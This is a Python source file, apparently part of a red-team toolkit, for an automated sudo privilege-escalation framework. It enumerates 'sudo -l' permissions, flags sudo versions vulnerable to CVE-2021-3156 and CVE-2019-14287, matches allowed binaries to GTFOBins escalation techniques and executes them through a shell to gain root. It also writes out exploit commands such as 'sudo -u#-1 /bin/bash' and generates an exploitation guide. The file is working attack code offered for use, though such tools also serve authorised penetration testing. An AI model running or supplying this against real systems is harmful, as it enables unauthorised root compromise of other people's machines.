"""
Sudo Exploitation Framework
===========================

Main orchestrator for sudo privilege escalation.
"""
import subprocess
import json
from pathlib import Path
from datetime import datetime
from typing import List, Optional

from .gtfobins import GTFOBinsSudo
from .permissions import (
    SudoPermission, SudoCommand, ExploitableCommand,
    ExploitResult, ExploitStatus, SudoScanResult
)
from ..parsers.sudo_parser import SudoParser


class SudoExploiter:
    """
    Main sudo exploitation framework.

    Discovers sudo misconfigurations and attempts automated exploitation.

    Usage:
        exploiter = SudoExploiter()
        results = exploiter.scan_and_exploit()
        exploiter.save_report(results)
    """

    BANNER = '''
    ╔═══════════════════════════════════════════════════════════════╗
    ║     Sudo Exploitation Framework                               ║
    ║     Part of: 30 Days of Red Team Toolkit                      ║
    ║─────────────────────────────────────────────────────────────────║
    ║     "sudo make me a sandwich. sudo make me root."             ║
    ╚═══════════════════════════════════════════════════════════════╝
    '''

    # Known vulnerable sudo versions
    VULNERABLE_VERSIONS = {
        'CVE-2021-3156': {
            'name': 'Baron Samedit',
            'description': 'Heap-based buffer overflow',
            'check': lambda v: v and ('1.8' in v or ('1.9' in v and 'p' not in v)),
            'exploit_url': 'https://github.com/blasty/CVE-2021-3156'
        },
        'CVE-2019-14287': {
            'name': 'Sudo User ID Bypass',
            'description': 'Run commands as root using UID -1',
            'check': lambda v: v and '1.8' in v,
            'exploit_cmd': 'sudo -u#-1 /bin/bash'
        }
    }

    def __init__(self, output_dir: Optional[str] = None, verbose: bool = False):
        """
        Initialize the exploiter.

        Args:
            output_dir: Directory for reports
            verbose: Enable verbose output
        """
        self.gtfobins = GTFOBinsSudo()
        self.parser = SudoParser(self.gtfobins)
        self.verbose = verbose

        self.output_dir = Path(output_dir) if output_dir else Path("/tmp/sudo_exploit")
        self.output_dir.mkdir(exist_ok=True, mode=0o755)

        print(self.BANNER)
        print(f"[+] Loaded {len(self.gtfobins)} GTFOBins sudo techniques")
        print(f"[+] Output directory: {self.output_dir}")

    def scan(self) -> SudoScanResult:
        """
        Scan for sudo permissions without exploitation.

        Returns:
            SudoScanResult with discovered permissions
        """
        print(f"\n{'=' * 60}")
        print("SUDO PERMISSION ENUMERATION")
        print(f"{'=' * 60}")

        result = SudoScanResult()

        # Get sudo version
        result.sudo_version = self.parser.get_sudo_version()

        if result.sudo_version:
            print(f"[*] Sudo version: {result.sudo_version}")
            self._check_version_vulnerabilities(result.sudo_version)

        # Get sudo -l output
        print(f"\n[*] Checking sudo permissions (sudo -l)...")

        sudo_output, error = self.parser.get_sudo_output()

        if error:
            print(f"[-] {error}")
            return result

        if not sudo_output:
            print(f"[-] No sudo permissions found")
            return result

        print(f"[+] Got sudo permissions:")
        print(sudo_output)

        # Parse permissions
        result.permissions = self.parser.parse(sudo_output)

        print(f"\n[+] Parsed {len(result.permissions)} permission entries")

        # Find exploitable commands
        result.exploitable = self._find_exploitable(result.permissions)

        result.print_summary()

        return result

    def _check_version_vulnerabilities(self, version: str) -> None:
        """Check sudo version for known vulnerabilities"""
        print(f"\n[*] Checking for version vulnerabilities...")

        for cve, info in self.VULNERABLE_VERSIONS.items():
            if info['check'](version):
                print(f"[+] POTENTIALLY VULNERABLE TO {cve}!")
                print(f"    Name: {info['name']}")
                print(f"    Description: {info['description']}")

                if 'exploit_url' in info:
                    print(f"    Exploit: {info['exploit_url']}")

                if 'exploit_cmd' in info:
                    print(f"    Command: {info['exploit_cmd']}")

    def _find_exploitable(self, permissions: List[SudoPermission]) -> List[ExploitableCommand]:
        """Find exploitable commands from permissions"""
        print(f"\n[*] Identifying exploitable sudo commands...")

        exploitable = []

        for perm in permissions:
            for cmd in perm.commands:
                if self.parser.is_exploitable(cmd):
                    nopasswd_str = " [NOPASSWD]" if perm.nopasswd else ""
                    print(f"[+] EXPLOITABLE: sudo {cmd.name}{nopasswd_str}")

                    exploits = self.parser.get_exploits(cmd)
                    url = f"https://gtfobins.github.io/gtfobins/{cmd.name}/#sudo"

                    exploitable.append(ExploitableCommand(
                        permission=perm,
                        command=cmd,
                        exploits=exploits,
                        gtfobins_url=url if not cmd.is_all else ""
                    ))

        print(f"\n[+] Found {len(exploitable)} exploitable sudo commands")

        return exploitable

    def exploit(
            self,
            target: ExploitableCommand,
            test_only: bool = True
    ) -> ExploitResult:
        """
        Attempt to exploit a sudo command.

        Args:
            target: The exploitable command
            test_only: Run 'id' instead of spawning shell

        Returns:
            ExploitResult
        """
        print(f"\n[*] Attempting exploitation: sudo {target.command.name}")

        # Get techniques from GTFOBins
        binary_exploits = self.gtfobins.get(target.command.name)

        if not binary_exploits and not target.command.is_all:
            return ExploitResult(
                target=target,
                technique="None",
                command_executed="",
                status=ExploitStatus.UNTESTED,
                error="No known exploitation techniques"
            )

        # For ALL permission, use simple techniques
        if target.command.is_all:
            techniques = [
                ("Direct sudo id", "sudo id", True),
                ("Sudo bash", "sudo /bin/bash", False),
                ("Sudo su", "sudo su -", False)
            ]
        else:
            techniques = []

            for tech in binary_exploits.techniques:
                if test_only and tech.test_command:
                    techniques.append((tech.description, tech.test_command, True))
                elif not tech.interactive:
                    techniques.append((tech.description, tech.command, False))
                else:
                    # Show interactive techniques but don't execute
                    print(f"[!] Interactive technique: {tech.description}")
                    print(f"    Command: {tech.command}")

        # Try each technique
        for description, command, is_test in techniques:
            print(f"\n[*] Trying: {description}")
            print(f"[*] Command: {command}")

            result = self._execute_exploit(target, description, command)

            if result.got_root:
                return result

        # If we get here, automated exploitation failed
        print(f"\n[-] Automated exploitation failed")
        print(f"[*] Try manual exploitation:")

        for exploit in target.exploits:
            print(f"    {exploit}")

        return ExploitResult(
            target=target,
            technique="All attempted",
            command_executed="Multiple",
            status=ExploitStatus.INTERACTIVE if binary_exploits else ExploitStatus.FAILED
        )

    def _execute_exploit(
            self,
            target: ExploitableCommand,
            technique: str,
            command: str
    ) -> ExploitResult:
        """Execute exploitation command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )

            output = result.stdout + result.stderr

            # Check for root
            got_root = 'uid=0' in output or 'euid=0' in output

            print(f"[*] Output: {output[:200]}")

            if got_root:
                status = ExploitStatus.SUCCESS
            else:
                status = ExploitStatus.FAILED

            return ExploitResult(
                target=target,
                technique=technique,
                command_executed=command,
                status=status,
                output=output,
                got_root=got_root
            )

        except subprocess.TimeoutExpired:
            return ExploitResult(
                target=target,
                technique=technique,
                command_executed=command,
                status=ExploitStatus.ERROR,
                error="Command timed out"
            )
        except Exception as e:
            return ExploitResult(
                target=target,
                technique=technique,
                command_executed=command,
                status=ExploitStatus.ERROR,
                error=str(e)
            )

    def scan_and_exploit(
            self,
            test_only: bool = True,
            stop_on_success: bool = True
    ) -> SudoScanResult:
        """
        Scan for sudo permissions and attempt exploitation.

        Args:
            test_only: Run test commands instead of spawning shells
            stop_on_success: Stop after first successful exploit

        Returns:
            SudoScanResult with exploitation results
        """
        print(f"\n{'=' * 60}")
        print("AUTOMATED SUDO EXPLOITATION")
        print(f"{'=' * 60}")

        # Scan first
        result = self.scan()

        if not result.exploitable:
            print(f"\n[-] No exploitable sudo commands found")
            return result

        # Exploitation phase
        print(f"\n{'=' * 60}")
        print("EXPLOITATION PHASE")
        print(f"{'=' * 60}")

        # Prioritize NOPASSWD commands
        sorted_targets = sorted(
            result.exploitable,
            key=lambda x: (not x.is_nopasswd, not x.command.is_all)
        )

        for target in sorted_targets:
            exploit_result = self.exploit(target, test_only)
            result.exploit_results.append(exploit_result)

            if exploit_result.got_root and stop_on_success:
                print(f"\n[+] ROOT ACHIEVED via sudo {target.command.name}!")
                print(f"[*] To get an interactive shell, run:")

                for exploit in target.exploits[:3]:
                    print(f"    {exploit}")

                break

        return result

    def exploit_specific(
            self,
            binary_name: str,
            test_only: bool = True
    ) -> ExploitResult:
        """
        Exploit a specific sudo binary.

        Args:
            binary_name: Name of the binary (e.g., 'vim', 'find')
            test_only: Run test command instead of shell

        Returns:
            ExploitResult
        """
        print(f"\n{'=' * 60}")
        print(f"EXPLOITING: sudo {binary_name}")
        print(f"{'=' * 60}")

        # Check if binary is in GTFOBins
        if not self.gtfobins.has(binary_name):
            print(f"[-] No known exploits for: sudo {binary_name}")
            print(f"[*] Check: https://gtfobins.github.io/gtfobins/{binary_name}/#sudo")

            return ExploitResult(
                target=ExploitableCommand(
                    permission=SudoPermission(raw_line=""),
                    command=SudoCommand(full_path="", name=binary_name)
                ),
                technique="N/A",
                command_executed="",
                status=ExploitStatus.UNTESTED,
                error="No known exploitation techniques"
            )

        # Create exploitable command
        exploits = [tech.command for tech in self.gtfobins.get(binary_name).techniques]

        target = ExploitableCommand(
            permission=SudoPermission(raw_line=f"(root) /usr/bin/{binary_name}"),
            command=SudoCommand(full_path=f"/usr/bin/{binary_name}", name=binary_name),
            exploits=exploits,
            gtfobins_url=f"https://gtfobins.github.io/gtfobins/{binary_name}/#sudo"
        )

        return self.exploit(target, test_only)

    def save_report(self, result: SudoScanResult, filename: str = "sudo_report.json") -> Path:
        """Save scan results to JSON"""
        report_path = self.output_dir / filename

        with open(report_path, 'w') as f:
            json.dump(result.to_dict(), f, indent=2)

        print(f"\n[+] Report saved: {report_path}")

        return report_path

    def generate_exploit_guide(self, result: SudoScanResult) -> Path:
        """Generate quick exploitation guide"""
        guide_path = self.output_dir / "exploit_guide.txt"

        with open(guide_path, 'w') as f:
            f.write("SUDO EXPLOITATION GUIDE\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

            if result.sudo_version:
                f.write(f"Sudo Version: {result.sudo_version}\n\n")

            if result.has_all_permission:
                f.write("[!!!] FULL SUDO ACCESS DETECTED\n")
                f.write("Commands:\n")
                f.write("  sudo su -\n")
                f.write("  sudo /bin/bash\n\n")

            if result.exploitable:
                f.write("EXPLOITABLE COMMANDS\n")
                f.write("-" * 60 + "\n\n")

                for target in result.exploitable:
                    nopasswd = " [NOPASSWD]" if target.is_nopasswd else ""
                    f.write(f"[{target.command.name}]{nopasswd}\n")

                    if target.gtfobins_url:
                        f.write(f"GTFOBins: {target.gtfobins_url}\n")

                    f.write("Commands:\n")

                    for exploit in target.exploits[:3]:
                        f.write(f"  {exploit}\n")

                    f.write("\n")

        print(f"[+] Exploit guide saved: {guide_path}")

        return guide_path

    def list_techniques(self, binary_name: str) -> None:
        """List all sudo exploitation techniques for a binary"""
        techniques = self.gtfobins.get(binary_name)

        if not techniques:
            print(f"[-] No techniques found for: sudo {binary_name}")
            print(f"[*] Check: https://gtfobins.github.io/gtfobins/{binary_name}/#sudo")
            return

        print(f"\n{'=' * 60}")
        print(f"SUDO TECHNIQUES FOR: {binary_name}")
        print(f"{'=' * 60}")
        print(f"GTFOBins: {techniques.url}")

        if techniques.notes:
            print(f"Notes: {techniques.notes}")

        for i, tech in enumerate(techniques.techniques, 1):
            print(f"\n[{i}] {tech.description}")
            print(f"    Type: {tech.exploit_type.value}")
            print(f"    Command: {tech.command}")

            if tech.interactive:
                print(f"    ⚠ Requires interactive terminal")